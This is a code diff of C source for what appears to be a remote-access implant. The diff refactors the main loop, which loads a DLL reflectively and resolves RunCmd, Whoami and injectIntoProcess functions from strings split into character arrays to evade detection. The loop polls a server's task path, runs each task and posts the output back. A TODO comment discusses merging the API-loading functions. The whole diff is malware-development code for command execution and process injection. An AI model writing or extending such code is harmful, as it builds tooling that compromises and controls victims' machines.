@@ -35,20 +35,43 @@ void myMain()
         DEBUG_PRINTF_ERROR("%s", "myMain: AgentPopulate failed\n");
     }
 
+    // TODO: Combine the functions AGENT_loadReflectiveDll/AGENT_loadReflectiveHttpDll/... and _populate_esgStd_api/_populate_base_api/... under one
+    //       function called `AGENT_populateApi(Agent* agent, <something helps decide what to populate>)` How should I handle the second parameter?
+    //       I could pass a VOID pointer in the second parameter. Every API class would have a magic byte to determine what they are so that
+    //       AGENT_populateApi can tell, using an if-else statement, which function to run all by itself.
+    //       Example:
+    //
+    //       ```
+    //       // loader.c
+    //       ESG_STD_API esgStdApi;
+    //       AGENT_populateApi(agent, (LPVOID)&esgStdApi);
+    //
+    //       // agent.c
+    //       VOID AGENT_populateApi(Agent* agent, LPVOID api)
+    //       {
+    //          if ( (*(ESG_STD_API*)api).magic == ESG_STD_API_MAGIC)      // Dereference LPVOID api to ESG_STD_API and check for its magic byte
+    //          {
+    //              DLL esgStdDll = AGENT_loadReflectiveDll(agent);        // load the necessary DLL for ESG_STD_API
+    //              *(ESG_STD_API*)api = _populate_esgStd_api(esgStdDll);  // use the function to populate an ESG_STD_API struct
+    //          }
+    //          else if ( (*(API*)api).magic == BASE_API_MAGIC )           // Dereference LPVOID api to API and check for its magic byte
+    //          {
+    //              *(API*)api = _populate_base_api();                     // use the function to populate an API struct
+    //          }
+    //          // ... so on and so forth
+    //       }
+    //
+    //       ```
+    //
+    //       Or I could put the following functions as callbacks in the <API type> field: _populate_esgStd_api, _populate_base_api
+    //       AGENT_populateApi(agent, _populate_base_api)
+    //       But I don't like this approach because it exposes the internals of the AGENT_populateApi
+
     // TODO: Implement IoC by using function callbacks as parameters so that the only function that I need to run is loadReflectiveDll to load any DLL I want
     DLL esgStdDll = AGENT_loadReflectiveDll(agent);
     PDLL pEsgStdDll = &esgStdDll;
 
-    CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
-    CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
-    CHAR injectIntoProcess_c[] = { 'i', 'n', 'j', 'e', 'c', 't', 'I', 'n', 't', 'o', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
-
-    ESG_STD_API EsgStdApi = { 0 };
-    PESG_STD_API PEsgStdApi = &EsgStdApi;
-
-    PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, runCmd_c);
-    PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, whoami_c);
-    PEsgStdApi->injectIntoProcess = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, injectIntoProcess_c);
+    ESG_STD_API esgStdApi = _populate_esgStd_api(pEsgStdDll);
 
     WCHAR pathTasks[] = { '/', 't', 'a', 's', 'k', 's', '/', UUID_M };
 
@@ -71,8 +94,7 @@ void myMain()
     WCHAR pathSendTaskOutput[] =
     {
         '/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u',
-        't', '/', UUID_M
-    };
+        't', '/', UUID_M };
 
     while (TRUE)
     {
@@ -95,7 +117,7 @@ void myMain()
             continue;
         }
 
-        if (AgentExecuteTask(agent, PEsgStdApi, pEsgStdDll, task, &taskOutput, &sizeOfOutput) == FALSE)
+        if (AgentExecuteTask(agent, &esgStdApi, pEsgStdDll, task, &taskOutput, &sizeOfOutput) == FALSE)
         {
             DEBUG_PRINTF_WARNING("%s", "myMain: AgentExecuteTask failed, no task present or execution failed\n");
             ((SLEEP)agent->api.Sleep)(agent->_interval);
